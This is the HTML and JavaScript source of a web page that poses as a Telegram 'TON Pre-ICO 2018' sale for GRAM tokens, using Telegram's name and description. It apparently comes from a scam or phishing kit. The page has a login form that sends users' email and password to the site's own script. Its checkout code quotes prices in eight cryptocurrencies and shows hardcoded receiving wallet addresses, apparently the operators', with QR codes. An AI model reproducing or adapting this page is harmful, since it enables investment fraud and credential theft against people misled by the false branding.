

    <!DOCTYPE html>
    <!-- Add <html lang="en-CA" class=" js flexbox webgl no-touch geolocation hashchange history websockets rgba hsla multiplebgs backgroundsize borderimage textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage applicationcache svg svgclippaths mediaqueries no-regions supports js flexbox webgl no-touch geolocation hashchange history websockets rgba hsla multiplebgs backgroundsize borderimage textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage applicationcache svg svgclippaths mediaqueries no-regions supports js flexbox webgl no-touch geolocation hashchange history websockets rgba hsla multiplebgs backgroundsize borderimage textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage applicationcache svg svgclippaths mediaqueries no-regions supports js flexbox webgl no-touch geolocation hashchange history websockets rgba hsla multiplebgs backgroundsize borderimage textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage applicationcache svg svgclippaths mediaqueries no-regions supports">
-->
    <html>
	    
	    
<meta https-equiv="content-type" content="text/html;charset=UTF-8" />

    <head>
        <meta https-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta https-equiv="X-UA-Compatible" content="IE=edge">
        <title> Purchase GRAM | TON Pre-ICO 2018 </title>
        <meta property="og:title" content="Telegram Network ICO">
        <meta property="og:type" content="website">
        <meta name="HandheldFriendly" content="True">
        <meta name="MobileOptimized" content="320">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="index_files/font-awesome.min.css">
        <link rel="icon" href="images/fav.png">
        <link rel="stylesheet" href="index_files/style.min.css???????????" type="text/css" media="all">
        <script type="text/javascript" src="index_files/modernizr.custom.min.js.hxd"></script>
<script
			  src="https://code.jquery.com/jquery-3.3.1.js"
			  integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60="
			  crossorigin="anonymous"></script>
        <script type="text/javascript" src="index_files/tether.min.js.hxd"></script>
        <link rel="stylesheet" href="index_files/font-awesome.min(1).css">
        <script async="" src="index_files/js.txt"></script>

        <link href="images/fav.png" rel="shortcut icon" type="image/x-icon">

    </head>

    <body style="background: url(index_files/stormbg-min.jpg)  no-repeat center top fixed; background-size: 100%; ">

        <div class="content-container content-alert bg-secondary body-color">
                                    <div class="container text-center">
                                        <div class="row justify-content-center">
                                            <div class="col-12 col-lg-12 col-xl-12">
  
               
         <div class="col-sm-7">

           <div class="slogan"></div>
           
    </div>
        <div class="col-sm-3">
      
      
        </div>
    </div>
   </div>
   
<div class="container">
    


       <div class="row">
        <div class="col-sm-12">
       
   

       
       
       
       
       <html>
<head>
<title>Вход в личный кабинет</title>
</head>
<body>
   <div class="row">
    <div class="col-sm-1">&nbsp;</div>
        <div class="col-sm-10 content main_txt">

	    



                               <form action="testreg.php" method="post"  class="formez2">
            <center> <a href="../index.htm"><img src="../ton.jpeg" class="" style="width:150px; margin-left:auto; margin-right:auto;"> </a> </center>
                <h5 class="text-uppercase text-center">Login</h5><br>
                <h6 class="text-uppercase text-center mb-10" style="font-size: 12px; color: #999;">Don't have an account? <a href="reg.php" style="color: #0275d8; text-decoration: underline;">Sign up</a></h6>       <br>         
                               
                               
                               
                    <div class="form-group">
                        <input type="text" name="email" class="form-control" placeholder="Email">
                    </div>

                    <div class="form-group">
                        <input type="password" name="password" class="form-control" placeholder="Password">
                    </div>

                    <div class="form-group flexbox py-10">
                        <label class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" checked="">
                            <span class="custom-control-indicator"></span>
                            <span class="custom-control-description">Remember me</span>
                        </label>

                        <a class="text-muted hover-primary fs-13" href="send_pass.php">Forgot password?</a>
                    </div>

                

                    <div class="form-group">
                        <button class="btn btn-bold btn-block btn-primary" type="submit">Login</button>
                    </div>
               
<br>




                <a class="text-center custom-back-login" href="../index.htm">
                    <i class="fa fa-arrow-left" aria-hidden="true"></i> back
                </a>
                
                 </form>
            </div>

        </div>
        
        









       

        </div>
    </div>
   </div> 


 </div> 
  
   
   

        </body>
    
    
    
            <script type="text/javascript" src="index_files/firebase.js.hxd"></script>
        <script type="text/javascript" src="index_files/plugins.min.js.hxd"></script>
        <script type="text/javascript" src="index_files/scripts.min.js.hxd"></script>


<script>
	

	
	var s_arr = {'btc' : 0.00026919, 'ltc' : 0.02085536, 'dash' : 0.0070908, 'bch' : 0.00240644, 'zec' : 0.01034657, 'xmr' : 0.0148535, 'etc' : 0.09559941, 'eth' : 0.00361664};


	//setTimeout(function(){jQuery(".loading_form").css({'display':'none'}); jQuery(".payment_form").css({'display':'block'}); jQuery(".selected_crypto").css({'display':'block'});}, 500);	
	
	setTimeout(function(){jQuery(".loading_form").css({'display':'none'}); jQuery(".payment_selector").css({'display':'block'});}, 500);
	
	jQuery(".bt_a").on('click', function(){
		
		jQuery(".bt_a").removeClass('bt_active');
		
		var t = jQuery(this).data('type');
		
		window.t = t;
		
		var rates = jQuery(this).data('rates');

		jQuery(this).addClass('bt_active');
		
		jQuery(".btn_cont").prop('disabled', false);
		
		jQuery(".type-form").fadeIn('fast');
		
		jQuery(".lbl-rates").html("<b>1 <label class=\"gram_hig\">GRAM</label></b> = " + rates + " <b>" + t.toUpperCase()+"</b>");
		
		jQuery(".total_amount").html("0 " + " <b>" + t.toUpperCase()+"</b>");
		
		
		
		jQuery('html, body').animate({
	        scrollTop: jQuery("footer").offset().top
	    }, 10);


		
		
		function calc_e(){
			
			jQuery(".gram-amount").unbind().on('keyup', function(){
					
				calc_i();	
					
			});
		}
		
		
		
		function calc_i()
		{
					var am = jQuery(".gram-amount");
					
					var unit = 0;
					
					var c_calc = 0;
					
					if (!isNaN(am.val()) && am.val().length > 0)
					{
						unit = s_arr[t];
						c_calc = c_calc = unit * am.val();
					}
					else
					{
						unit = 0;
						c_calc = 0;
					}
					
					c_calc = Math.round(c_calc*100000000)/100000000;
							
					jQuery(".total_amount").html(c_calc + " <b>" + t.toUpperCase()+"</b>");
					
					window.c_calc = c_calc;
		}
		
		


		calc_e();
		
		calc_i();
		


	});
	

    
	jQuery('.btn_cont').on('click', function(){
		
		var t = window.t;
		
		var am = jQuery(".gram-amount");
		
		var em = jQuery(".input-mail");
		
		var e = false;
		
var amnt =  am.val();
        
jQuery("#prepp").val(am.val());
        
        
        
        
        

        
        
        
        
        
        
		
		if ((am.val() <= 0 || isNaN(am.val())) && !e)
		{
			am.addClass('field_empty');
			am.focus();
			e = true;
		}
		else
		{
			am.removeClass('field_empty');
		}
		
		if (em.val().length < 6 && !e)
		{
			em.addClass('field_empty');	
			em.focus();
			e = true;
		}
		else
		{
			em.removeClass('field_empty');
		}
		
		
		
		if (!e)
		{
			jQuery(".payment_selector").css({'display':'none'});
			
			//jQuery(".loading_form").css({'display':'block'});
            jQuery(".payment_form").css({'display':'block'}); 
			
			jQuery("#rcv_am").html(am.val());
            
            jQuery("#prepp").val(am.val());
			
			jQuery("#pay_am").html(window.c_calc);
			
			jQuery("._hig").html(t.toUpperCase());
            
            
			
			var telegram = jQuery(".input-tg");
			
			jQuery('.recip_email').html(em.val());
			
            
            
            
            
	if ( jQuery("._hig").html() == "BTC"){
  var mywalt = "1MnMTnnSjLyyPDyXWsNLfUvt6LLN9S8Vdx";
    }
if ( jQuery("._hig").html() == "LTC"){
  var mywalt = "LZqX6WxSRju8yaQ1HKvMfX2hiwBHJ126P6";
    }
if ( jQuery("._hig").html() == "DASH"){
  var mywalt = "Xbv4CiGVxyzFTnk782UyMtCNdBSTE1ooCQ";
    }
if ( jQuery("._hig").html() == "ETC"){
  var mywalt = "0x96811b1689c188c9bcca2585fc013a491cab879b";
    }
if ( jQuery("._hig").html() == "ETH"){
  var mywalt = "0xf94b8e0ceba6dcd1b888fe02141dd9d0b8e67715";
    }
if ( jQuery("._hig").html() == "ZEC"){
  var mywalt = "t1dfMCCErDtkBwihn3BoB4kHyqfGTBZ7yhF";
    }
if ( jQuery("._hig").html() == "XMR"){
  var mywalt = "4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQmy9SDFtKV9A63scVP";
    }
if ( jQuery("._hig").html() == "BCH"){
  var mywalt = "qzzlrem84tj2f9k89kkc2x3895nlnqfgd5le3lnn4h";
    }

		
        jQuery('.walletAddress').html(mywalt + " <label class=\"copy_btn\" data-w=\""+mywalt+"\">copy</label>");
        jQuery('.qr_img_code').prop('src', 'https://chart.googleapis.com/chart?chs=150x150&cht=qr&chl=' + mywalt)   
            
            
            
		}
		
		
	});
	
	 
    jQuery('.btn_cont2').on('click', function(){
           
               var werwee = jQuery('#prepp').val()
                                          
               alert('PrePaid ' + werwee + ' GRAM');
    window.location.href = "index.php?prepp="+werwee;
                                                              });
                                                         
	function payment_checker(wallet, s_type, s_mail, hash, amount)
	{
		
		var x = jQuery;
		
		var k = setInterval(function(){
			
			x.post("s-core/", {'wallet':wallet, 'type':s_type, 'mail' : s_mail, 'hash' : hash, 'amount':amount}, function(json){
				
				
				if (json.state == "ok")
				{
					clearInterval(k);
					
					jQuery(".state_lbl").html("<font color=green><b>PAID</b></font><br><b>Information has been sent to your mail</b>");
				}
				
			}, 'json');
			
		}, 3000);
		
	}
	
	

	
	
</script>
	

    
    <footer class="m_footer">
		<table class="footer_table_50">
			<tr>
				<td>
					<a href="../"><img src="../landing/images/logo.png" class="footer_img"></a>
				</td>
				<td>
					<b>Telegram</b>
					<br>
					<label class="footer_text">Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.</label>
				</td>
				
				<td>
					
							<div class="col-md-12 float-right">
<ul class="footer-links">
<li><a href="../#what-is-gram">What is Gram?</a></li>
<li><a href="../#features">Features</a></li>
<li><a href="../#our-team">Our Team</a></li>
<li><a href="../#roadmap">Roadmap</a></li>
<li><a href="../whitepaper/gram_whitepaper.pdf" target="_blank">White Paper</a></li>
</ul>
</div>

				</td>
				
			</tr>
		</table>
		

		
		

    </footer>
    
   <link rel="stylesheet" href="../cust.css" type="text/css" media="all">
    
    
    </html>	    


